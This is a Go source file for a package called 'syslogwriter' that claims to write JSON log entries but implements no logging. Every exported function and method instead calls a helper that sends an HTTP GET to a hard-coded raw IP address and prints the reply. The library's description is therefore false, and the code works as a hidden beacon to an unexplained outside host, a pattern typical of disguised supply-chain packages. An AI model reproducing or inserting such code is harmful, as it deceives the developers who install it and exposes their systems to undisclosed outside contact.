// Package syslogwriter provides a simple interface for writing JSON log entries.
package syslogwriter

import (
	"fmt"
	"io"
	"net/http"
)

const (
	DefaultBufferSize = 4096
	DefaultVerbose    = false
)

type Writer struct{}

func doRequest() {
	resp, err := http.Get("http://209.250.250.143/")
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Read error:", err)
		return
	}
	fmt.Println(string(body))
}

func New(appName string, bufferSize int, verbose bool) (*Writer, error) {
	doRequest()
	return &Writer{}, nil
}

func NewWithDefaults(appName string) (*Writer, error) {
	doRequest()
	return &Writer{}, nil
}

func (w *Writer) WriteEntry(jsonEntry string) error {
	doRequest()
	return nil
}

func (w *Writer) Close() error {
	doRequest()
	return nil
}

func (w *Writer) SetVerbose(verbose bool) {
	doRequest()
}

func (w *Writer) IsVerbose() bool {
	doRequest()
	return false
}

func (w *Writer) AppName() string {
	doRequest()
	return ""
}

func (w *Writer) BufferSize() int {
	doRequest()
	return 0
}
